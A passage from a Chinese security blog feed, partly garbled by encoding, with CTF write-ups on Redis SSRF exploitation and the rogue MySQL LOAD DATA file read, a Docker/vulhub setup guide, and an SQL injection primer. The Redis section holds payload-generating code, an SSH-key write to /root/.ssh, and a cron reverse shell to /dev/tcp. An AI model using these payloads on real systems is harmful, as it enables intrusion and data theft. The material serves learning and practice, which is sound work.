set dbfilename {}&quot;.format(filename),     &quot;save&quot;     ]if passwd:    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):    CRLF=&quot;\r\n&quot;    redis_arr = arr.split(&quot; &quot;)    cmd=&quot;&quot;    cmd+=&quot;*&quot;+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)    cmd+=CRLF    return cmdif __name__==&quot;__main__&quot;:    for x in cmd:        payload += urllib.quote(redis_format(x))    print payload</code></pre><p>ç”Ÿæˆä¹‹åç”¨curlrç„¶åæŸ¥è¯¢shellæ˜¯å¦å†™å…¥</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="å†™shell"></p><p>å†™å…¥æˆåŠŸ</p><h3 id="å†™sshå…¬é’¥"><a href="#å†™sshå…¬é’¥" class="headerlink" title="å†™sshå…¬é’¥"></a>å†™sshå…¬é’¥</h3><p>å¦‚æœ<code>.ssh</code>ç›®å½•å­˜åœ¨ï¼Œåˆ™ç›´æ¥å†™å…¥<code>~/.ssh/authorized_keys</code><br>å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨<code>crontab</code>åˆ›å»ºè¯¥ç›®å½•</p><p>æ„é€ rediså‘½ä»¤</p><pre><code>flushallset 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali&apos;config set dir /root/.ssh/config set dbfilename authorized_keyssave</code></pre><p>æ”¹ç¬¬ä¸€ä¸ªè„šæœ¬</p><pre><code>filename=&quot;authorized_keys&quot;ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;path=&quot;/root/.ssh/&quot;</code></pre><p>è¿˜æ˜¯ç”¨curlæ‰“ä¸€å‘</p><h3 id="åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell"><a href="#åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell" class="headerlink" title="åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell"></a>åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell</h3><p>Centosçš„å®šæ—¶ä»»åŠ¡åœ¨<code>/var/spool/cron/&lt;username&gt;</code>å’Œ/etc/crontabï¼Œé«˜ç‰ˆæœ¬redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ•…æ— æ³•å®ç°</p><p>æ„é€ rediså‘½ä»¤</p><pre><code>flushallset 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>æ”¹ç¬¬ä¸€ä¸ªå‘½ä»¤</p><pre><code>reverse_ip=&quot;192.168.163.132&quot;reverse_port=&quot;2333&quot;cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)filename=&quot;root&quot;path=&quot;/var/spool/cron&quot;</code></pre><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><blockquote><p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL LOAD DATA</title>
      <link href="/2019/08/07/MySQL-LOAD-DATA/"/>
      <url>/2019/08/07/MySQL-LOAD-DATA/</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡ä¼ªé€ æ¶æ„æœåŠ¡å™¨é€ æˆçš„æ”»å‡»<br>ğŸ˜«ğŸ˜„</p><a id="more"></a><h1 id="é…ç½®mysql"><a href="#é…ç½®mysql" class="headerlink" title="é…ç½®mysql"></a>é…ç½®mysql</h1><h2 id="å¯åŠ¨mysqlæœåŠ¡"><a href="#å¯åŠ¨mysqlæœåŠ¡" class="headerlink" title="å¯åŠ¨mysqlæœåŠ¡"></a>å¯åŠ¨mysqlæœåŠ¡</h2><pre><code>service mysql startMariaDB [mysql]&gt; create database test;MariaDB [test]&gt; create table users(    -&gt; id int auto_increment primary key,    -&gt; username varchar(30),    -&gt; password varchar(30));Query OK, 0 rows affected (0.026 sec)MariaDB [test]&gt; insert into users (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</code></pre><h2 id="è®¾ç½®å¯†ç "><a href="#è®¾ç½®å¯†ç " class="headerlink" title="è®¾ç½®å¯†ç "></a>è®¾ç½®å¯†ç </h2><pre><code>use mysqlupdate user set password=PASSWORD(&apos;admin&apos;) where User=&apos;root&apos;;flush privileges;quitservice mysql restartmysql -h 127.0.0.1 -u root -p  #å¦‚æœtcpdumpæŠ“ä¸åˆ°åŒ…å°±å°è¯•è®¾ç½® -hå‚æ•°æŒ‡å®šä¸ºæœ¬åœ°å›ç¯åœ°å€</code></pre><h2 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h2><pre><code>tcpdump -i lo port 3306 -w test.cap</code></pre><p>tcpdumpä½¿ç”¨æŒ‡å—ï¼š<a href="https://www.cnblogs.com/pyng/p/9698723.html" title="tcpdumpä½¿ç”¨" target="_blank" rel="noopener">https://www.cnblogs.com/pyng/p/9698723.html</a></p><h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>load data infile ä¸»è¦æ˜¯è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å¹¶ä¸”æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­ï¼Œé€šå¸¸æœ‰ä¸¤ç§ç”¨æ³•</p><pre><code>load data infile &quot;/data/data.csv&quot; into table TestTable fields terminated by &apos;åˆ†éš”ç¬¦;            //è¯»å–æœåŠ¡å™¨æ–‡ä»¶load data local infile &quot;/home/lightless/data.csv&quot; into table TestTable fields terminated by &apos;åˆ†éš”ç¬¦; //è¯»å–æœ¬åœ°æ–‡ä»¶</code></pre><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£<br><img src="https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>æˆ‘ä»¬è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶æŠ“å–3306ç«¯å£æµé‡åˆ†æ</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdhx9h84j30jx02lt9b.jpg" alt="è¯»å–æœ¬åœ°æ–‡ä»¶ test.txt"></p><p>æ–‡ä»¶å†…å®¹æ˜¯ <code>hello world!</code></p><p>æŠ“å–æµé‡</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdhzvg9vj30k602n0u2.jpg" alt="æŠ“å–3306ç«¯å£æµé‡"></p><p>ä¸¢è¿›wireshark</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdi51lqsj30l20kz77j.jpg" alt="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨"></p><p>ç¬¬ä¸€ä¸ªåŒ…çœ‹èµ·æ¥æ¯”è¾ƒæ­£å¸¸ï¼Œæ˜¯å®¢æˆ·ç«¯å‘èµ·çš„<code>Request Query</code>ï¼Œå¦‚æœä½ æ— æ³•ä½¿ç”¨<code>LOAD DATA INFILE</code>è¯­æ³•çš„è¯ï¼Œè€ƒè™‘åœ¨è¿æ¥ <code>MySQL</code> çš„æ—¶å€™åŠ ä¸Š<code>--enable-local-infile</code>é€‰é¡¹ï¼Œæˆ–è€…è®¾ç½®<code>local_infile</code>å…¨å±€å˜é‡ä¸º<code>ON</code>ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ˜¯å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚åŒ…ï¼ŒåŒ…å«äº†è¯·æ±‚å‘½ä»¤ã€‚</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5rdi2fq31j30kd0cgjt2.jpg" alt="æœåŠ¡å™¨åº”ç­”"></p><p>æœåŠ¡å™¨å¯¹è¯·æ±‚åšå‡ºå“åº”ï¼Œå“åº”å†…å®¹åŒ…å«äº†æ–‡ä»¶åã€‚</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdi7lfm1j30kx0dyjtf.jpg" alt="å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ï¼Œå‘é€æ–‡ä»¶å†…å®¹"></p><p>å®¢æˆ·ç«¯å‘é€æœåŠ¡å™¨è¿”å›çš„æ–‡ä»¶åçš„æ–‡ä»¶å†…å®¹ç»™æœåŠ¡å™¨ã€‚</p><p>äºæ˜¯æˆ‘ä»¬æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å‘é€æŸ¥è¯¢ä¹‹åï¼Œè¿”å›ä¸€ä¸ªResponse TABULARæ•°æ®åŒ…ï¼Œå¹¶é™„ä¸Šæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥è¯»å–å®¢æˆ·ç«¯çš„æ–‡ä»¶äº†ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚å¼•ç”¨å¤§ä½¬<a href="https://lightless.me/archives/read-mysql-client-file.html" title="å¤§ä½¬" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a>çš„æ–‡ç« </p><blockquote><pre><code>å®¢æˆ·ç«¯ï¼šhi~ æˆ‘å°†æŠŠæˆ‘çš„ data.csv æ–‡ä»¶ç»™ä½ æ’å…¥åˆ° test è¡¨ä¸­ï¼æœåŠ¡ç«¯ï¼šOKï¼Œè¯»å–ä½ æœ¬åœ° data.csv æ–‡ä»¶å¹¶å‘ç»™æˆ‘ï¼å®¢æˆ·ç«¯ï¼šè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼šbalabalï¼</code></pre><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæµç¨‹ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬åˆ¶ä½œäº†æ¶æ„çš„å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å›å¤æœåŠ¡ç«¯ä»»æ„ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦è·å–çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚</p><pre><code>å®¢æˆ·ç«¯ï¼šhi~ æˆ‘å°†æŠŠæˆ‘çš„ data.csv æ–‡ä»¶ç»™ä½ æ’å…¥åˆ° test è¡¨ä¸­ï¼æœåŠ¡ç«¯ï¼šOKï¼Œè¯»å–ä½ æœ¬åœ°çš„ / etc/passwd æ–‡ä»¶å¹¶å‘ç»™æˆ‘ï¼å®¢æˆ·ç«¯ï¼šè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼šbalabalï¼ˆ/etc/passwd æ–‡ä»¶çš„å†…å®¹ï¼‰ï¼</code></pre></blockquote><p>ä¼ªé€ çš„æœåŠ¡ç«¯å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å›å¤ä¸€ä¸ª file-transfer è¯·æ±‚ï¼Œä¸ä¸€å®šéè¦æ˜¯åœ¨LOAD DATA LOCALçš„æ—¶å€™ã€‚</p><h1 id="ä¼ªé€ æœåŠ¡ç«¯"><a href="#ä¼ªé€ æœåŠ¡ç«¯" class="headerlink" title="ä¼ªé€ æœåŠ¡ç«¯"></a>ä¼ªé€ æœåŠ¡ç«¯</h1><p>åˆ©ç”¨githubä¸Šé¡¹ç›®ï¼š <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><blockquote><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a><br><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql load data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04 é…ç½®docker</title>
      <link href="/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/"/>
      <url>/2019/08/02/ubuntu%E9%85%8D%E7%BD%AEdocker/</url>
      
        <content type="html"><![CDATA[<p>å­¦ä¼šè£…dockerï¼Œèµ°éå¤©ä¸‹éƒ½ä¸æ€•!<br>ğŸ˜Š ğŸ†’</p><a id="more"></a><h1 id="Ubuntu-16-04-é…ç½®docker"><a href="#Ubuntu-16-04-é…ç½®docker" class="headerlink" title="Ubuntu 16.04 é…ç½®docker"></a>Ubuntu 16.04 é…ç½®docker</h1><p>æƒ³è£…ä¸ªdockerå¥½å¥½å­¦å­¦pç¥çš„vulhub:<a href="https://github.com/vulhub/vulhub" title="pç¥-vulhub">https://github.com/vulhub/vulhub</a></p><h2 id="æ›´æ–°æº"><a href="#æ›´æ–°æº" class="headerlink" title="æ›´æ–°æº"></a>æ›´æ–°æº</h2><p>å…ˆå¤‡ä»½</p><pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</code></pre><p>æ›´æ¢</p><pre><code>sudo gedit /etc/apt/sources.list</code></pre><p>é˜¿é‡Œ</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</code></pre><p>æ¸…å</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</code></pre><p>ç½‘æ˜“</p><pre><code>deb http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ wily-backports main restricted universe multiverse</code></pre><p>æ‰§è¡Œæ›´æ–°</p><pre><code>sudo apt-get update</code></pre><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</p><pre><code>uname -r</code></pre><p>å¯åŠ¨æœåŠ¡</p><pre><code>sudo service docker start</code></pre><p>æµ‹è¯•</p><pre><code>docker run hello-world</code></pre><h2 id="é•œåƒåŠ é€Ÿ"><a href="#é•œåƒåŠ é€Ÿ" class="headerlink" title="é•œåƒåŠ é€Ÿ"></a>é•œåƒåŠ é€Ÿ</h2><p>æ–°å»º<code>/etc/docker/daemon.json</code>æ–‡ä»¶æ¥é…ç½®daemonï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­åŠ å…¥</p><pre><code>{  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}</code></pre><h2 id="dockerä½¿ç”¨"><a href="#dockerä½¿ç”¨" class="headerlink" title="dockerä½¿ç”¨"></a>dockerä½¿ç”¨</h2><p>æˆ‘ä»¬é€šè¿‡ä½¿ç”¨<code>-t -i</code>å‚æ•°æ¥è¿›å…¥äº¤äº’å¼ç»ˆç«¯</p><pre><code>docker run -i -t ubuntu:15.10 /bin/bash</code></pre><p>æˆ‘ä»¬å·²è¿›å…¥ç»ˆç«¯ï¼Œå¯ä»¥ä½¿ç”¨<code>ls</code>ï¼Œ<code>cat /proc/version</code>æŸ¥çœ‹ä¿¡æ¯.</p><p>æˆ‘ä»¬ä½¿ç”¨ -d å‚æ•°åˆ›å»ºä¸€ä¸ªä»¥è¿›ç¨‹æ–¹å¼è¿è¡Œçš„å®¹å™¨</p><p>docker -d </p><p>æˆ‘ä»¬ä½¿ç”¨ ps æ¥æŸ¥çœ‹å®¹å™¨ä¿¡æ¯</p><pre><code>docker ps</code></pre><p>æˆ‘ä»¬ä½¿ç”¨ stop æ¥åœæ­¢å®¹å™¨</p><pre><code>docker stop name</code></pre><p>æˆ‘ä»¬ä½¿ç”¨<code>docker images</code> æ¥åˆ—å‡ºæœ¬åœ°é•œåƒåˆ—è¡¨</p><p>ä½¿ç”¨ <code>docker pull</code> æ¥è·å¾—ä¸€ä¸ªé•œåƒ</p><p>ä½¿ç”¨ <code>docker search name</code> æ¥æŸ¥æ‰¾ä¸€ä¸ªé•œåƒ</p><h3 id="è¿è¡Œä¸€ä¸ªwebåº”ç”¨"><a href="#è¿è¡Œä¸€ä¸ªwebåº”ç”¨" class="headerlink" title="è¿è¡Œä¸€ä¸ªwebåº”ç”¨"></a>è¿è¡Œä¸€ä¸ªwebåº”ç”¨</h3><p>åœ¨dockerä¸­è¿è¡Œä¸€ä¸ªPython flask åº”ç”¨æ¥è¿è¡Œä¸€ä¸ªwebåº”ç”¨ã€‚</p><pre><code>docker pull training/webapp #è½½å…¥é•œåƒdocker run -d -P training/webapp python app.py</code></pre><p>-På°†å®¹å™¨å†…éƒ¨ä½¿ç”¨çš„ç½‘ç»œç«¯å£éšæœºæ˜ å°„åˆ°æˆ‘ä»¬ä½¿ç”¨çš„ä¸»æœºé«˜ç«¯å£ä¸Š<br>-på®¹å™¨å†…éƒ¨ç«¯å£ç»‘å®šåˆ°æŒ‡å®šä¸»æœºç«¯å£</p><p>å¦å¤– æˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šIPåœ°å€ã€‚</p><h2 id="ä¸‹è½½vulhub"><a href="#ä¸‹è½½vulhub" class="headerlink" title="ä¸‹è½½vulhub"></a>ä¸‹è½½vulhub</h2><pre><code>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zip</code></pre><p>è§£å‹æ—¶å€™å¯èƒ½ä¼šæŠ¥é”™</p><pre><code>unzip:  cannot find zipfile directory in one of vulhub-master.zip orvulhub-master.zip.zip, and cannot find vulhub-master.zip.ZIP, period.</code></pre><p>æˆ‘ä»¬æ¢ä¸ªå‹ç¼©æ–¹å¼å°±æˆ</p><pre><code>sudo apt-get install fastjarjar xvf vulhub-master.zip</code></pre><p>ç„¶å</p><pre><code>cd vulhub-master# Enter the directory of vulnerability/environmentcd flask/ssti# Compile environmentdocker-compose build# Run environmentdocker-compose up -d</code></pre><p>æ„‰å¿«çš„å­¦ä¹ å§ï¼</p><h2 id="å¤ç°ctfç¯å¢ƒ"><a href="#å¤ç°ctfç¯å¢ƒ" class="headerlink" title="å¤ç°ctfç¯å¢ƒ"></a>å¤ç°ctfç¯å¢ƒ</h2><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p>å…ˆè¿›å…¥dockerfileç›®å½•ï¼Œå»ºç«‹ä¸€ä¸ªimages</p><pre><code>docker build -t name . docker run -i -d -p 20000:80 name</code></pre><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><pre><code>docker-compose builddocker-compose up -d</code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a><br><a href="https://www.runoob.com/docker/docker-container-connection.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-container-connection.html</a><br><a href="https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found" target="_blank" rel="noopener">https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found</a><br><a href="https://blog.csdn.net/qq_35451572/article/details/79516563" target="_blank" rel="noopener">https://blog.csdn.net/qq_35451572/article/details/79516563</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLå…¥é—¨</title>
      <link href="/2019/08/02/SQL%E5%85%A5%E9%97%A8/"/>
      <url>/2019/08/02/SQL%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Sqlæ³¨å…¥çœŸçš„è¶…ç¥å¥‡çš„ï¼Œæˆ‘æ€ä¹ˆéƒ½å­¦ä¸ä¼šå‘¢ï¼<br>ğŸ˜€</p><a id="more"></a><h1 id="å¼€å§‹ä¹‹å‰"><a href="#å¼€å§‹ä¹‹å‰" class="headerlink" title="å¼€å§‹ä¹‹å‰"></a>å¼€å§‹ä¹‹å‰</h1><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><h3 id="ç³»ç»Ÿå‡½æ•°"><a href="#ç³»ç»Ÿå‡½æ•°" class="headerlink" title="ç³»ç»Ÿå‡½æ•°"></a>ç³»ç»Ÿå‡½æ•°</h3><ul><li>version() mysqlç‰ˆæœ¬</li><li>user() æ•°æ®åº“ç”¨æˆ·å</li><li>database() æ•°æ®åº“å</li><li>@@datadir æ•°æ®åº“è·¯å¾„</li><li>@@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬</li></ul><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><ul><li>concat(str1,str2, â€¦) æ²¡æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</li><li>concat_ws(separator,str1,str2,â€¦) æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</li><li>group_concat(str1,str2,â€¦) è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</li></ul><h3 id="å¸¸ç”¨å°è¯•è¯­å¥"><a href="#å¸¸ç”¨å°è¯•è¯­å¥" class="headerlink" title="å¸¸ç”¨å°è¯•è¯­å¥"></a>å¸¸ç”¨å°è¯•è¯­å¥</h3><ul><li>or 1=1 â€“+(æ³¨é‡Šç¬¦)</li><li>â€˜ or 1=1 â€“+</li><li>â€œ or 1=1 â€“+</li><li>) or 1=1 â€“+</li><li>â€˜) or 1=1 â€“+</li><li>â€œ) or 1=1 â€“+</li><li>â€œ)) or 1=1 â€“+</li><li>â€“+å¯ä»¥ç”¨#æ›¿æ¢</li></ul><p>æŸ¥è¯¢è¯­å¥ä¸€èˆ¬ä¸º</p><pre><code>$sql=&quot;SELECT * from users where id = &apos;$id&apos; limit 0,1&quot;</code></pre><p>ä»ä¸Šé¢çš„å°è¯•è¯­å¥æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥è¯­å¥çš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯äººä¸ºé—­åˆ <code>$id</code> åé¢çš„åŠä¸ªå•å¼•å·ï¼Œä¸€ä¸ªæ˜¯æ³¨é‡Šæ•´ä¸ªè¯­å¥åçš„å¼•å·ã€‚</p><h3 id="union-æ“ä½œç¬¦"><a href="#union-æ“ä½œç¬¦" class="headerlink" title="union æ“ä½œç¬¦"></a>union æ“ä½œç¬¦</h3><p>unionæ“ä½œç¬¦ç”¨æ¥åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªSELECTè¯­å¥çš„ç»“æœé›†ã€‚ä½¿ç”¨unionæ—¶çš„selectè¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼ŒåŒæ—¶åˆ—ä¹Ÿå¿…é¡»æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ï¼Œä¸”æ¯æ¡selectè¯­å¥ä¸­åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚</p><p>ä¾‹å¦‚è¿™ä¸¤æœ‰ä¸‰ä¸ªæ•°æ®è¡¨</p><pre><code>+-----------------+| Tables_in_test1 |+-----------------+| emails          || user            || users           |+-----------------+select * from emails;+--------+-------------+| number | addr        |+--------+-------------+|  1     | 123@126.com |+--------+-------------+1 row in set (0.00 sec)+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  |</code></pre><p>ä¸¤ä¸ªè¡¨çš„åˆ—æ•°é‡ä¸åŒåˆ™æˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨UNION</p><pre><code>mysql&gt; select * from emails UNION select * from user;ERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><p>é»˜è®¤çš„ï¼ŒUNIONæ“ä½œç¬¦é€‰å–ä¸åŒçš„å€¼ï¼Œå¦‚æœå…è®¸é‡å¤çš„è¯è¯·ä½¿ç”¨UNION 